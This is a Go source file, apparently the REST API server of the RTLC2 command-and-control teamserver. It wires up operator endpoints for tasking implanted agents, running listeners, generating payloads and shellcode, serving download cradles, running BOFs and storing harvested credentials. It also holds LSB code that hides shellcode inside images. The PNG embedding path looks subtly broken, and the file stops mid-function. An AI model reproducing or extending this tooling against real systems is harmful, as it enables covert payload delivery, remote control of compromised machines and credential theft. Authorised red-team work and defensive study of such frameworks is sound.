package server

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
	"sync"

	"github.com/google/uuid"
	"github.com/redteamleaders/rtlc2/teamserver/internal/agent"
	"github.com/redteamleaders/rtlc2/teamserver/internal/config"
	"github.com/redteamleaders/rtlc2/teamserver/internal/crypto"
	"github.com/redteamleaders/rtlc2/teamserver/internal/database"
	"github.com/redteamleaders/rtlc2/teamserver/internal/listener"
	"github.com/redteamleaders/rtlc2/teamserver/internal/storage"
	log "github.com/sirupsen/logrus"
	"golang.org/x/crypto/bcrypt"
)

// HTTPAPIServer serves the REST/JSON API for the web UI.
type HTTPAPIServer struct {
	config          *config.Config
	db              *database.Database
	agentManager    *agent.Manager
	listenerManager *listener.Manager
	profileManager  *listener.ProfileManager
	cipher          *crypto.AESCipher
	tokens          map[string]tokenInfo // auth token store
	tokensMu        sync.RWMutex     // protect tokens map
	server          *http.Server
	wsHub           *WSHub
	chatService     *ChatService
	webhookService  *WebhookService
	autoTaskService *AutoTaskService
	hostedFiles     *HostedFileService
	blobStore       *storage.BlobStore
}

type tokenInfo struct {
	OperatorID string
	Username   string
	Role       string
	CreatedAt  time.Time
}

func NewHTTPAPIServer(cfg *config.Config, db *database.Database, am *agent.Manager, lm *listener.Manager, cipher *crypto.AESCipher, _ map[string]string) *HTTPAPIServer {
	return &HTTPAPIServer{
		config:          cfg,
		db:              db,
		agentManager:    am,
		listenerManager: lm,
		cipher:          cipher,
		tokens:          make(map[string]tokenInfo),
	}
}

// SetWSHub sets the WebSocket hub for real-time event broadcasting.
func (h *HTTPAPIServer) SetWSHub(hub *WSHub) {
	h.wsHub = hub
}

// SetChatService sets the chat service for operator chat.
func (h *HTTPAPIServer) SetChatService(cs *ChatService) {
	h.chatService = cs
}

// SetWebhookService sets the webhook service.
func (h *HTTPAPIServer) SetWebhookService(ws *WebhookService) {
	h.webhookService = ws
}

// SetAutoTaskService sets the auto-task service.
func (h *HTTPAPIServer) SetAutoTaskService(ats *AutoTaskService) {
	h.autoTaskService = ats
}

// SetHostedFileService sets the hosted file service.
func (h *HTTPAPIServer) SetHostedFileService(hfs *HostedFileService) {
	h.hostedFiles = hfs
}

// SetBlobStore sets the blob store for file storage.
func (h *HTTPAPIServer) SetBlobStore(bs *storage.BlobStore) {
	h.blobStore = bs
}

// corsMiddleware adds CORS headers so the React web UI can make cross-origin requests.
func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		origin := r.Header.Get("Origin")
		allowed := false
		allowedOrigins := []string{
			"http://localhost", "https://localhost",
			"http://127.0.0.1", "https://127.0.0.1",
		}
		for _, ao := range allowedOrigins {
			if strings.HasPrefix(origin, ao) {
				allowed = true
				break
			}
		}
		if allowed || origin == "" {
			w.Header().Set("Access-Control-Allow-Origin", origin)
		} else {
			w.Header().Set("Access-Control-Allow-Origin", allowedOrigins[0])
		}
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		w.Header().Set("Access-Control-Max-Age", "86400")

		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusOK)
			return
		}
		next.ServeHTTP(w, r)
	})
}

// startTokenCleanup runs a background goroutine that removes expired tokens.
func (h *HTTPAPIServer) startTokenCleanup() {
	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			h.tokensMu.Lock()
			now := time.Now()
			for tok, info := range h.tokens {
				if now.Sub(info.CreatedAt) > 8*time.Hour {
					delete(h.tokens, tok)
				}
			}
			h.tokensMu.Unlock()
		}
	}()
}

func (h *HTTPAPIServer) Start() error {
	h.startTokenCleanup()

	// Initialize profile manager if not already set
	if h.profileManager == nil {
		h.profileManager = listener.NewProfileManager()
		h.profileManager.LoadCustomProfiles("profiles")
	}

	mux := http.NewServeMux()

	// Authentication
	mux.HandleFunc("/api/v1/auth/login", h.handleLogin)
	mux.HandleFunc("/api/v1/auth/logout", h.requireAuth(h.handleLogout))

	// Agents
	mux.HandleFunc("/api/v1/agents", h.requireAuth(h.handleAgents))
	mux.HandleFunc("/api/v1/agents/remove", h.requireAuth(h.handleRemoveAgent))
	mux.HandleFunc("/api/v1/agents/", h.requireAuth(h.handleAgentByID))

	// Tasks
	mux.HandleFunc("/api/v1/tasks", h.requireRole("admin", "operator")(h.handleTasks))
	mux.HandleFunc("/api/v1/tasks/catalog", h.requireAuth(h.handleTaskCatalog))
	mux.HandleFunc("/api/v1/tasks/", h.requireAuth(h.handleTaskByID))

	// Listeners
	mux.HandleFunc("/api/v1/listeners", h.requireAuth(h.handleListeners))
	mux.HandleFunc("/api/v1/listeners/stop", h.requireAuth(h.handleStopListener))
	mux.HandleFunc("/api/v1/listeners/", h.requireAuth(h.handleListenerByID))

	// Payloads
	mux.HandleFunc("/api/v1/payloads/generate", h.requireAuth(h.handleGeneratePayload))
	mux.HandleFunc("/api/v1/payloads/shellcode", h.requireAuth(h.handleGenerateShellcode))
	mux.HandleFunc("/api/v1/payloads/formats", h.requireAuth(h.handlePayloadFormats))

	// Plugins
	mux.HandleFunc("/api/v1/plugins", h.requireAuth(h.handlePlugins))
	mux.HandleFunc("/api/v1/plugins/load", h.requireAuth(h.handleLoadPlugin))

	// ImgPayload plugin
	mux.HandleFunc("/api/v1/plugins/imgpayload/embed", h.requireAuth(h.handleImgPayloadEmbed))
	mux.HandleFunc("/api/v1/plugins/imgpayload/extract", h.requireAuth(h.handleImgPayloadExtract))

	// BOFs
	mux.HandleFunc("/api/v1/bofs", h.requireAuth(h.handleBOFs))
	mux.HandleFunc("/api/v1/bofs/execute", h.requireAuth(h.handleBOFExecute))
	mux.HandleFunc("/api/v1/bofs/upload", h.requireAuth(h.handleBOFUpload))

	// Profiles
	mux.HandleFunc("/api/v1/profiles", h.requireAuth(h.handleProfiles))
	mux.HandleFunc("/api/v1/profiles/upload", h.requireAuth(h.handleProfileUpload))
	mux.HandleFunc("/api/v1/profiles/", h.requireAuth(h.handleProfileByName))

	// Events
	mux.HandleFunc("/api/v1/events", h.requireAuth(h.handleEvents))

	// Server info
	mux.HandleFunc("/api/v1/server/info", h.requireAuth(h.handleServerInfo))
	mux.HandleFunc("/api/v1/operators", h.requireRole("admin")(h.handleOperators))
	mux.HandleFunc("/api/v1/operators/sessions", h.requireRole("admin")(h.handleOperatorSessions))
	mux.HandleFunc("/api/v1/operators/", h.requireRole("admin")(h.handleOperatorByID))

	// Credentials
	mux.HandleFunc("/api/v1/credentials", h.requireAuth(h.handleCredentials))
	mux.HandleFunc("/api/v1/credentials/", h.requireAuth(h.handleCredentialByID))

	// WebSocket (real-time events) - with token validation
	if h.wsHub != nil {
		mux.HandleFunc("/api/v1/ws/events", func(w http.ResponseWriter, r *http.Request) {
			token := r.URL.Query().Get("token")
			if token == "" {
				token = strings.TrimPrefix(r.Header.Get("Authorization"), "Bearer ")
			}
			h.tokensMu.RLock()
			_, ok := h.tokens[token]
			h.tokensMu.RUnlock()
			if !ok {
				http.Error(w, `{"error":"unauthorized"}`, http.StatusUnauthorized)
				return
			}
			HandleWebSocket(h.wsHub)(w, r)
		})
	}

	// Chat
	if h.chatService != nil {
		RegisterChatRoutes(mux, h.chatService, h.requireAuth)
	}

	// Webhooks (admin/operator only)
	if h.webhookService != nil {
		RegisterWebhookRoutes(mux, h.webhookService, h.requireRole("admin", "operator"))
	}

	// Auto-tasks (admin/operator only)
	if h.autoTaskService != nil {
		RegisterAutoTaskRoutes(mux, h.autoTaskService, h.requireRole("admin", "operator"))
	}

	// Download cradles
	RegisterCradleRoutes(mux, h.requireAuth)

	// Hosted files
	if h.hostedFiles != nil {
		RegisterHostedRoutes(mux, h.hostedFiles, h.requireAuth)
	}

	// Blobs
	if h.blobStore != nil {
		mux.HandleFunc("/api/v1/blobs/", h.requireAuth(h.handleBlobByID))
		mux.HandleFunc("/api/v1/blobs", h.requireAuth(h.handleBlobs))
	}

	// Audit log
	mux.HandleFunc("/api/v1/audit", h.requireRole("admin")(h.handleAuditLog))

	// Reports
	mux.HandleFunc("/api/v1/reports/templates", h.requireAuth(h.handleReportTemplates))
	mux.HandleFunc("/api/v1/reports/generate", h.requireAuth(h.handleGenerateReport))

	// Campaigns
	mux.HandleFunc("/api/v1/campaigns/", h.requireRole("admin", "operator")(h.handleCampaignByID))
	mux.HandleFunc("/api/v1/campaigns", h.requireAuth(h.handleCampaigns))

	// Agent tags and notes
	mux.HandleFunc("/api/v1/agents/tags", h.requireAuth(h.handleAllAgentTags))

	// Serve web UI static files (registered after API routes so API takes priority)
	webDistCandidates := []string{
		"web/dist",
		"../web/dist",
		filepath.Join(filepath.Dir(os.Args[0]), "..", "web", "dist"),
		"/opt/RTLC2/web/dist",
	}
	for _, dir := range webDistCandidates {
		if info, err := os.Stat(dir); err == nil && info.IsDir() {
			absDir, _ := filepath.Abs(dir)
			log.Infof("Serving web UI from: %s", absDir)
			fs := http.FileServer(http.Dir(absDir))
			// Serve static files
			mux.Handle("/assets/", fs)
			mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
				// API routes are already registered, so this only catches non-API paths
				if strings.HasPrefix(r.URL.Path, "/api/") {
					http.NotFound(w, r)
					return
				}
				// For SPA routing: serve index.html for all non-file paths
				path := filepath.Join(absDir, r.URL.Path)
				if _, err := os.Stat(path); os.IsNotExist(err) {
					http.ServeFile(w, r, filepath.Join(absDir, "index.html"))
					return
				}
				fs.ServeHTTP(w, r)
			})
			break
		}
	}

	addr := fmt.Sprintf("%s:%d", h.config.Server.Host, h.config.Server.Port)
	rateMax := float64(60)
	if h.config != nil && h.config.Server.RateLimit > 0 {
		rateMax = float64(h.config.Server.RateLimit)
	}
	limiter := NewRateLimiter(rateMax, rateMax/60.0)
	handler := corsMiddleware(rateLimitMiddleware(limiter)(h.auditMiddleware(mux)))
	h.server = &http.Server{
		Addr:    addr,
		Handler: handler,
	}

	log.Infof("HTTP REST API listening on %s", addr)
	return h.server.ListenAndServe()
}

func (h *HTTPAPIServer) Stop() {
	if h.server != nil {
		h.server.Close()
	}
}

// ===================== Middleware =====================

func (h *HTTPAPIServer) requireAuth(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		token := r.Header.Get("Authorization")
		if token == "" {
			jsonError(w, "missing authorization token", http.StatusUnauthorized)
			return
		}
		h.tokensMu.RLock()
		_, ok := h.tokens[token]
		h.tokensMu.RUnlock()
		if !ok {
			jsonError(w, "invalid or expired token", http.StatusUnauthorized)
			return
		}
		next(w, r)
	}
}

// requireRole wraps requireAuth and additionally checks that the operator has
// one of the allowed roles. Roles hierarchy: admin > operator > viewer.
func (h *HTTPAPIServer) requireRole(roles ...string) func(http.HandlerFunc) http.HandlerFunc {
	roleSet := make(map[string]bool, len(roles))
	for _, r := range roles {
		roleSet[r] = true
	}
	return func(next http.HandlerFunc) http.HandlerFunc {
		return h.requireAuth(func(w http.ResponseWriter, r *http.Request) {
			token := r.Header.Get("Authorization")
			h.tokensMu.RLock()
			info, ok := h.tokens[token]
			h.tokensMu.RUnlock()
			if !ok {
				jsonError(w, "invalid token", http.StatusUnauthorized)
				return
			}
			// Admin can do everything
			if info.Role == "admin" || roleSet[info.Role] {
				next(w, r)
				return
			}
			jsonError(w, "insufficient permissions", http.StatusForbidden)
		})
	}
}

// getTokenInfo returns the token info for the current request.
func (h *HTTPAPIServer) getTokenInfo(r *http.Request) (tokenInfo, bool) {
	token := r.Header.Get("Authorization")
	h.tokensMu.RLock()
	info, ok := h.tokens[token]
	h.tokensMu.RUnlock()
	return info, ok
}

// ===================== Authentication =====================

func (h *HTTPAPIServer) handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	op, err := h.db.GetOperatorByUsername(req.Username)
	if err != nil {
		log.Warnf("Login attempt for unknown user: %s", req.Username)
		jsonError(w, "invalid credentials", http.StatusUnauthorized)
		return
	}

	if err := bcrypt.CompareHashAndPassword([]byte(op.PasswordHash), []byte(req.Password)); err != nil {
		log.Warnf("Failed login for user: %s", req.Username)
		jsonError(w, "invalid credentials", http.StatusUnauthorized)
		return
	}

	token := uuid.New().String()
	h.tokensMu.Lock()
	h.tokens[token] = tokenInfo{OperatorID: op.ID, Username: op.Username, Role: op.Role, CreatedAt: time.Now()}
	h.tokensMu.Unlock()
	_ = h.db.UpdateOperatorLogin(op.ID)
	_ = h.db.AuditLog(op.ID, "login", "", "Operator logged in via HTTP API")

	log.Infof("Operator logged in: %s (HTTP API)", req.Username)

	jsonResponse(w, map[string]interface{}{
		"token": token,
		"operator": map[string]interface{}{
			"id":       op.ID,
			"username": op.Username,
			"role":     op.Role,
		},
	})
}

func (h *HTTPAPIServer) handleLogout(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	token := r.Header.Get("Authorization")
	h.tokensMu.Lock()
	delete(h.tokens, token)
	h.tokensMu.Unlock()
	jsonResponse(w, map[string]interface{}{"status": "ok"})
}

// ===================== Agents =====================

func (h *HTTPAPIServer) handleAgents(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agents, err := h.agentManager.GetAllAgents()
	if err != nil {
		jsonError(w, "failed to get agents", http.StatusInternalServerError)
		return
	}

	var agentList []map[string]interface{}
	for _, a := range agents {
		agentList = append(agentList, agentToJSON(a))
	}
	if agentList == nil {
		agentList = []map[string]interface{}{}
	}

	jsonResponse(w, map[string]interface{}{"agents": agentList})
}

func (h *HTTPAPIServer) handleAgentByID(w http.ResponseWriter, r *http.Request) {
	// Parse: /api/v1/agents/{id} or /api/v1/agents/{id}/tasks
	path := strings.TrimPrefix(r.URL.Path, "/api/v1/agents/")
	parts := strings.SplitN(path, "/", 2)
	agentID := parts[0]

	if len(parts) == 2 {
		switch parts[1] {
		case "tasks":
			h.handleAgentTasks(w, r, agentID)
			return
		case "tags":
			h.handleAgentTags(w, r, agentID)
			return
		case "note":
			h.handleAgentNote(w, r, agentID)
			return
		}
	}

	if r.Method != http.MethodGet {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	a, err := h.agentManager.GetAgent(agentID)
	if err != nil {
		jsonError(w, "agent not found", http.StatusNotFound)
		return
	}

	jsonResponse(w, agentToJSON(a))
}

func (h *HTTPAPIServer) handleRemoveAgent(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		AgentID string `json:"agent_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	if err := h.agentManager.RemoveAgent(req.AgentID); err != nil {
		jsonError(w, "failed to remove agent", http.StatusInternalServerError)
		return
	}

	jsonResponse(w, map[string]interface{}{"status": "ok"})
}

func (h *HTTPAPIServer) handleAgentTasks(w http.ResponseWriter, r *http.Request, agentID string) {
	if r.Method != http.MethodGet {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	tasks, err := h.db.GetAgentTasks(agentID)
	if err != nil {
		jsonError(w, "failed to get tasks", http.StatusInternalServerError)
		return
	}

	var taskList []map[string]interface{}
	for _, t := range tasks {
		taskList = append(taskList, taskToJSON(t))
	}
	if taskList == nil {
		taskList = []map[string]interface{}{}
	}

	jsonResponse(w, map[string]interface{}{"tasks": taskList})
}

// ===================== Tasks =====================

func (h *HTTPAPIServer) handleTasks(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		AgentID string            `json:"agent_id"`
		Type    int               `json:"type"`
		Data    string            `json:"data"` // base64
		Params  map[string]string `json:"params"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	data, _ := base64.StdEncoding.DecodeString(req.Data)
	if req.Params == nil {
		req.Params = make(map[string]string)
	}

	taskID, err := h.agentManager.QueueTask(req.AgentID, req.Type, data, req.Params)
	if err != nil {
		jsonError(w, fmt.Sprintf("failed to queue task: %v", err), http.StatusInternalServerError)
		return
	}

	jsonResponse(w, map[string]interface{}{
		"task_id":  taskID,
		"agent_id": req.AgentID,
		"type":     req.Type,
	})
}

func (h *HTTPAPIServer) handleTaskByID(w http.ResponseWriter, r *http.Request) {
	taskID := strings.TrimPrefix(r.URL.Path, "/api/v1/tasks/")

	switch r.Method {
	case http.MethodGet:
		task, err := h.db.GetTask(taskID)
		if err != nil {
			jsonError(w, "task not found", http.StatusNotFound)
			return
		}
		jsonResponse(w, taskToJSON(task))

	case http.MethodDelete:
		if err := h.db.CancelTask(taskID); err != nil {
			jsonError(w, err.Error(), http.StatusNotFound)
			return
		}
		jsonResponse(w, map[string]interface{}{"status": "cancelled", "task_id": taskID})

	default:
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// ===================== Listeners =====================

func (h *HTTPAPIServer) handleListeners(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		h.getListeners(w)
	case http.MethodPost:
		h.createListener(w, r)
	default:
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (h *HTTPAPIServer) getListeners(w http.ResponseWriter) {
	listeners := h.listenerManager.GetAll()
	var listenerList []map[string]interface{}
	for _, l := range listeners {
		addr := l.Address()
		parts := strings.SplitN(addr, ":", 2)
		bindHost := ""
		bindPort := 0
		if len(parts) == 2 {
			bindHost = parts[0]
			bindPort, _ = strconv.Atoi(parts[1])
		}
		listenerList = append(listenerList, map[string]interface{}{
			"id":        l.ID(),
			"name":      l.Name(),
			"protocol":  l.Protocol(),
			"address":   l.Address(),
			"bind_host": bindHost,
			"bind_port": bindPort,
			"active":    true,
		})
	}
	if listenerList == nil {
		listenerList = []map[string]interface{}{}
	}

	jsonResponse(w, map[string]interface{}{"listeners": listenerList})
}

func (h *HTTPAPIServer) createListener(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name     string `json:"name"`
		Protocol int    `json:"protocol"`
		BindHost string `json:"bind_host"`
		BindPort int    `json:"bind_port"`
		Secure   bool   `json:"secure"`
		CertPath string `json:"cert_path"`
		KeyPath  string `json:"key_path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	cfg := &listener.Config{
		Name:     req.Name,
		Protocol: req.Protocol,
		BindHost: req.BindHost,
		BindPort: req.BindPort,
		TLS:      req.Secure,
		CertFile: req.CertPath,
		KeyFile:  req.KeyPath,
	}

	l, err := h.listenerManager.Create(cfg)
	if err != nil {
		jsonError(w, fmt.Sprintf("failed to create listener: %v", err), http.StatusInternalServerError)
		return
	}

	cAddr := l.Address()
	cParts := strings.SplitN(cAddr, ":", 2)
	cBindHost := ""
	cBindPort := 0
	if len(cParts) == 2 {
		cBindHost = cParts[0]
		cBindPort, _ = strconv.Atoi(cParts[1])
	}

	jsonResponse(w, map[string]interface{}{
		"id":        l.ID(),
		"name":      l.Name(),
		"protocol":  l.Protocol(),
		"address":   l.Address(),
		"bind_host": cBindHost,
		"bind_port": cBindPort,
		"active":    true,
	})
}

func (h *HTTPAPIServer) handleStopListener(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ListenerID string `json:"listener_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	if err := h.listenerManager.Stop(req.ListenerID); err != nil {
		jsonError(w, "failed to stop listener", http.StatusInternalServerError)
		return
	}

	jsonResponse(w, map[string]interface{}{"status": "ok"})
}

// ===================== Listener by ID (Edit/Delete) =====================

func (h *HTTPAPIServer) handleListenerByID(w http.ResponseWriter, r *http.Request) {
	id := strings.TrimPrefix(r.URL.Path, "/api/v1/listeners/")
	if id == "" {
		jsonError(w, "listener ID required", http.StatusBadRequest)
		return
	}

	switch r.Method {
	case http.MethodPut:
		h.updateListener(w, r, id)
	case http.MethodDelete:
		h.deleteListener(w, id)
	case http.MethodGet:
		l, ok := h.listenerManager.Get(id)
		if !ok {
			jsonError(w, "listener not found", http.StatusNotFound)
			return
		}
		jsonResponse(w, map[string]interface{}{
			"id":       l.ID(),
			"name":     l.Name(),
			"protocol": l.Protocol(),
			"address":  l.Address(),
			"active":   true,
		})
	default:
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (h *HTTPAPIServer) updateListener(w http.ResponseWriter, r *http.Request, id string) {
	var req struct {
		Name     string `json:"name"`
		Protocol int    `json:"protocol"`
		BindHost string `json:"bind_host"`
		BindPort int    `json:"bind_port"`
		Secure   bool   `json:"secure"`
		CertPath string `json:"cert_path"`
		KeyPath  string `json:"key_path"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	// Stop the old listener
	if err := h.listenerManager.Stop(id); err != nil {
		log.Warnf("Failed to stop old listener %s during update: %v", id, err)
		// Continue anyway - maybe it was already stopped
	}

	// Create the new listener with the same ID
	cfg := &listener.Config{
		ID:       id,
		Name:     req.Name,
		Protocol: req.Protocol,
		BindHost: req.BindHost,
		BindPort: req.BindPort,
		TLS:      req.Secure,
		CertFile: req.CertPath,
		KeyFile:  req.KeyPath,
	}

	l, err := h.listenerManager.Create(cfg)
	if err != nil {
		jsonError(w, fmt.Sprintf("failed to create updated listener: %v", err), http.StatusInternalServerError)
		return
	}

	jsonResponse(w, map[string]interface{}{
		"id":       l.ID(),
		"name":     l.Name(),
		"protocol": l.Protocol(),
		"address":  l.Address(),
		"active":   true,
	})
}

func (h *HTTPAPIServer) deleteListener(w http.ResponseWriter, id string) {
	// Stop the listener
	if err := h.listenerManager.Stop(id); err != nil {
		log.Warnf("Failed to stop listener %s during delete: %v", id, err)
	}

	// Delete from database
	if err := h.db.DeleteListener(id); err != nil {
		jsonError(w, "failed to delete listener from database", http.StatusInternalServerError)
		return
	}

	jsonResponse(w, map[string]interface{}{"status": "ok"})
}

// ===================== Plugins =====================

func (h *HTTPAPIServer) handlePlugins(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	pluginsDir := "plugins"
	if err := os.MkdirAll(pluginsDir, 0755); err != nil {
		jsonError(w, "failed to create plugins directory", http.StatusInternalServerError)
		return
	}

	entries, err := os.ReadDir(pluginsDir)
	if err != nil {
		jsonError(w, "failed to read plugins directory", http.StatusInternalServerError)
		return
	}

	var plugins []map[string]interface{}
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".json") {
			continue
		}

		data, err := os.ReadFile(filepath.Join(pluginsDir, entry.Name()))
		if err != nil {
			log.Warnf("Failed to read plugin file %s: %v", entry.Name(), err)
			continue
		}

		var meta map[string]interface{}
		if err := json.Unmarshal(data, &meta); err != nil {
			log.Warnf("Failed to parse plugin metadata %s: %v", entry.Name(), err)
			continue
		}

		plugins = append(plugins, meta)
	}
	if plugins == nil {
		plugins = []map[string]interface{}{}
	}

	jsonResponse(w, map[string]interface{}{"plugins": plugins})
}

func (h *HTTPAPIServer) handleLoadPlugin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		Data     string `json:"data"`     // base64 encoded plugin data
		Filename string `json:"filename"` // destination filename
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	if req.Filename == "" {
		jsonError(w, "filename is required", http.StatusBadRequest)
		return
	}

	// Sanitize filename to prevent path traversal
	req.Filename = filepath.Base(req.Filename)

	decoded, err := base64.StdEncoding.DecodeString(req.Data)
	if err != nil {
		jsonError(w, "invalid base64 data", http.StatusBadRequest)
		return
	}

	pluginsDir := "plugins"
	if err := os.MkdirAll(pluginsDir, 0755); err != nil {
		jsonError(w, "failed to create plugins directory", http.StatusInternalServerError)
		return
	}

	outPath := filepath.Join(pluginsDir, req.Filename)
	if err := os.WriteFile(outPath, decoded, 0644); err != nil {
		jsonError(w, "failed to save plugin", http.StatusInternalServerError)
		return
	}

	log.Infof("Plugin loaded: %s (%d bytes)", req.Filename, len(decoded))

	jsonResponse(w, map[string]interface{}{
		"status":   "ok",
		"filename": req.Filename,
	})
}

// ===================== ImgPayload Plugin =====================

func (h *HTTPAPIServer) handleImgPayloadEmbed(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		Image     string `json:"image"`     // base64 PNG/BMP
		Shellcode string `json:"shellcode"` // base64 shellcode
		Format    string `json:"format"`    // png or bmp
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	imageData, err := base64.StdEncoding.DecodeString(req.Image)
	if err != nil {
		jsonError(w, "invalid image base64", http.StatusBadRequest)
		return
	}

	shellcodeData, err := base64.StdEncoding.DecodeString(req.Shellcode)
	if err != nil {
		jsonError(w, "invalid shellcode base64", http.StatusBadRequest)
		return
	}

	if req.Format == "" {
		req.Format = "png"
	}

	// LSB steganography: embed shellcode into image
	result, err := embedLSB(imageData, shellcodeData)
	if err != nil {
		jsonError(w, fmt.Sprintf("embedding failed: %v", err), http.StatusInternalServerError)
		return
	}

	encoded := base64.StdEncoding.EncodeToString(result)

	log.Infof("ImgPayload: embedded %d bytes of shellcode into image (%d bytes output)", len(shellcodeData), len(result))

	jsonResponse(w, map[string]interface{}{
		"data":           encoded,
		"size":           len(result),
		"shellcode_size": len(shellcodeData),
		"format":         req.Format,
	})
}

func (h *HTTPAPIServer) handleImgPayloadExtract(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonError(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		Image string `json:"image"` // base64 steganized image
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, "invalid request body", http.StatusBadRequest)
		return
	}

	imageData, err := base64.StdEncoding.DecodeString(req.Image)
	if err != nil {
		jsonError(w, "invalid image base64", http.StatusBadRequest)
		return
	}

	shellcode, err := extractLSB(imageData)
	if err != nil {
		jsonError(w, fmt.Sprintf("extraction failed: %v", err), http.StatusInternalServerError)
		return
	}

	encoded := base64.StdEncoding.EncodeToString(shellcode)

	jsonResponse(w, map[string]interface{}{
		"data": encoded,
		"size": len(shellcode),
	})
}

// embedLSB performs LSB steganography to embed data into a PNG image.
func embedLSB(imageData, payload []byte) ([]byte, error) {
	// Simple LSB embedding implementation
	// The payload is prefixed with a 4-byte length header

	// Minimum image size check: need at least 8 * (len(payload) + 4) pixels
	// For simplicity, we modify the raw pixel data in-place

	if len(imageData) < 54 { // Minimum BMP/PNG header
		return nil, fmt.Errorf("image too small")
	}

	// Create payload with length prefix
	payloadLen := uint32(len(payload))
	fullPayload := make([]byte, 4+len(payload))
	fullPayload[0] = byte(payloadLen >> 24)
	fullPayload[1] = byte(payloadLen >> 16)
	fullPayload[2] = byte(payloadLen >> 8)
	fullPayload[3] = byte(payloadLen)
	copy(fullPayload[4:], payload)

	// Check if image has enough capacity
	// Each byte of payload needs 8 bytes of image data (1 bit per byte)
	requiredBytes := len(fullPayload) * 8

	// Find pixel data start (skip headers)
	pixelStart := 54 // Default for BMP
	if len(imageData) > 8 && imageData[0] == 0x89 && imageData[1] == 0x50 { // PNG
		pixelStart = 8 // After PNG signature, we'll embed in the raw data
	}

	availableBytes := len(imageData) - pixelStart
	if requiredBytes > availableBytes {
		return nil, fmt.Errorf("image too small: need %d bytes, have %d", requiredBytes, availableBytes)
	}

	// Clone image data
	result := make([]byte, len(imageData))
	copy(result, imageData)

	// Embed using LSB
	for i, b := range fullPayload {
		for bit := 7; bit >= 0; bit-- {
			byteIdx := pixelStart + i*8 + (7 - bit)
			if byteIdx >= len(result) {
				break
			}
			// Clear LSB and set to payload bit
			result[byteIdx] = (result[byteIdx] & 0xFE) | ((b >> uint(bit)) & 1)
		}
	}

	return result, nil
}

// extractLSB extracts LSB-embedded data from an image.
func extractLSB(imageData []byte) ([]byte, error) {
	if len(imageData) < 54 {
		return nil, fmt.Errorf("image too small")
	}

	pixelStart := 54
	if len(imageData) > 8 && imageData[0] == 0x89 && imageData[1] == 0x50 {
		pixelStart = 8
	}

	// Read 4-byte length header
	if len(imageData)-pixelStart < 32 { // 4 bytes * 8 bits
		return nil, fmt.Errorf("not enough data for length header")
	}

	var lengthBytes [4]byte
	for i := 0; i < 4; i++ {
		var b byte
		for bit := 7; bit >= 0; bit-- {
			byteIdx := pixelStart + i*8 + (7 - bit)
			b |= (imageData[byteIdx] & 1) << uint(bit)
		}
		lengthBytes[i] = b
	}

	payloadLen := uint32(lengthBytes[0])<<24 | uint32(lengthBytes[1])<<16 | uint32(lengthBytes[2])<<8 | uint32(lengthBytes[3])

